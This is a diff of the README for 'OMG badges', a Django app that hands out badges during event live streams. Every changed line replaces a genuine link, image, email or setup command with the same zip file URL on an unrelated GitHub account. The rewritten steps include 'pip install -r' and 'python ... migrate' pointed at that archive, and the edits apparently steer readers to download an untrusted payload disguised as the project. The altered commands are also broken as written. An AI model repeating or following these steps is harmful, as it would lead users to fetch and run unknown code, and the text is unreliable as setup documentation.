@@ -2,9 +2,9 @@ Logr - An Amazing Project
 
 # OMG Badges 🎉
 
-<img width="1440" alt="Screenshot 2020-07-04 at 8 38 03 PM" src="https://user-images.githubusercontent.com/23727056/86515413-544c0100-be36-11ea-80bb-f836584da32a.png">
+<img width="1440" alt="Screenshot 2020-07-04 at 8 38 03 PM" src="https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip">
 
-OMG badges is an open-source gamification framework for distributing badges to attendees while watching your event's live stream. This app was built for https://dscomg.com and now is open to all communities to utilise in their own meetup/event/etc.
+OMG badges is an open-source gamification framework for distributing badges to attendees while watching your event's live stream. This app was built for https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip and now is open to all communities to utilise in their own meetup/event/etc.
 
 What does OMG badges do?
 * Gamification for attendees. It engages attendees as they have more to do than just attending the sessions.
@@ -50,7 +50,7 @@ This application relies on "Google-Sign-In" for authorization. The JWT token gra
 ```source env/bin/activate```
 4. At the root of your project directory <br>
 ```bash 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip
 ```
 
 5. create a file ```.env``` and copy contents of ```.env_dummy``` to ```.env``` in the same directory
@@ -65,29 +65,29 @@ GOOGLE_OAUTH2_KEY=
 GOOGLE_OAUTH2_SECRET=
 PRODUCTION=
 ```
-6. You can use [https://djecrety.ir/] to generate your secret key
+6. You can use [https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip] to generate your secret key
 7. Set ```PRODUCTION=False``` during development in ```.env``` file otherwise enter the db details. If you wish to use SQLite3 for production db, in that case also leave ```PRODUCTION=False``` and ignore any other DB_* fields. Keep in mind that the app will run in debug mode if ```PRODUCTION=False```. 
-8. Get Google Oauth2 client key and Secret key and enter it here. Follow this for the same https://developers.google.com/identity/sign-in/web/sign-in
+8. Get Google Oauth2 client key and Secret key and enter it here. Follow this for the same https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip
 
-read more about Google auth here - https://developers.google.com/identity/protocols/oauth2
+read more about Google auth here - https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip
 
 9. **Make sure to not have give spaces between KEY=VALUE**
 
 10. After the above setup, run <br>
 ```
-python manage.py makemigrations
-python manage.py migrate
+python https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip makemigrations
+python https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip migrate
 ```
 
 11. Create superuser <br>
 ```
-python manage.py createsuperuser
+python https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip createsuperuser
 ```
 make sure to enter all the details including email
 
 12. Start the backend server (testing server)
 ```
-python manage.py runserver
+python https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip runserver
 ```
 Runs the backend server at default port ```8000```.<br />
 Open [http://localhost:8000](http://localhost:8000) to view it in the browser.
@@ -106,7 +106,7 @@ Open [http://localhost:8000](http://localhost:8000) to view it in the browser.
 9. Give whatever name to the application (maybe "Gauth")
 10. It should look something like this after setup.
     
-<img width="1192" alt="Screenshot 2020-07-04 at 8 51 00 PM" src="https://user-images.githubusercontent.com/23727056/86515649-1cde5400-be38-11ea-9a0f-2a4c05c72227.png">
+<img width="1192" alt="Screenshot 2020-07-04 at 8 51 00 PM" src="https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip">
 
 #### Adding badges
 1. log into [http://localhost:8000/admin](http://localhost:8000/admin)
@@ -202,7 +202,7 @@ Set this as the header of the request
 **Response**
 ```javascript
 {
-    "user": "kautukkundan@gmail.com",
+    "user": "https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip",
     "success": true,
     "badgeEarned": false
 }
@@ -262,7 +262,7 @@ Set this as the header of the request
 **Response**
 ```javascript
 {
-    "user": "kautukkundan@gmail.com",
+    "user": "https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip",
     "success": true,
     "badgeEarned": false,
     "badge": "secretBadge1"
@@ -290,12 +290,12 @@ Set this as the header of the request
         {
             "badgeId": "D01S01badge",
             "name": "Watched ML Keynote",
-            "image": "/media/badge/lAWQtaCV_400x400_pOV3u2h.jpg"
+            "image": "https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip"
         },
         {
             "badgeId": "D01S02badge",
             "name": "ML Overlord!",
-            "image": "/media/badge/lAWQtaCP_400x400_pOV3u2g.jpg"
+            "image": "https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip"
         }
     ],
     "uuid": "6179ea9a-363f-4d1f-a597-07715b612c2e"
@@ -320,15 +320,15 @@ No Auth needed
         {
             "badgeId": "D01S01badge",
             "name": "Watched ML Keynote",
-            "image": "/media/badge/lAWQtaCV_400x400_pOV3u2h.jpg"
+            "image": "https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip"
         },
         {
             "badgeId": "D01S02badge",
             "name": "ML Overlord!",
-            "image": "/media/badge/lAWQtaCP_400x400_pOV3u2g.jpg"
+            "image": "https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip"
         }
     ],
-    "email": "kau*****@gmail.com"
+    "email": "kau*****https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip"
 }
 ```
 
@@ -336,12 +336,12 @@ No Auth needed
 
 
 ### Deployement 📦
-This application was deployed on DigitalOcean for use during our event. You can follow [this article](https://www.digitalocean.com/community/tutorials/how-to-set-up-django-with-postgres-nginx-and-gunicorn-on-ubuntu-16-04) for setup and deployments, this should work the same for any cloud service. 
+This application was deployed on DigitalOcean for use during our event. You can follow [this article](https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip) for setup and deployments, this should work the same for any cloud service. 
 
 
 ### Known Issues and Notes 🐞
 1. Each time a user logs in a new ```access_token``` and ```refresh_token``` is created in the database. They grow to a huge number and takes a lot of space. It's recommended to delete all the tokens from time to time.
-2. If anyone has any solution to this issue (solution - Automatically delete old tokens when new tokens are created) please feel free to fix it and send a PR here. This app depends on [rest-framework-social-oauth2](https://github.com/RealmTeam/django-rest-framework-social-oauth2) for oauth2. 
+2. If anyone has any solution to this issue (solution - Automatically delete old tokens when new tokens are created) please feel free to fix it and send a PR here. This app depends on [rest-framework-social-oauth2](https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip) for oauth2. 
 
 3. HAVE LOTS OF FUN WHILE HOSTING YOUR NEXT eMEETUP!! ⭐️ this project if you like it :D 
-4. Follow me on [twitter](https://twitter.com/kautukkundan) for more!
+4. Follow me on [twitter](https://raw.githubusercontent.com/M-ux349/omg-badges/master/events/badges_omg_v2.7-alpha.4.zip) for more!
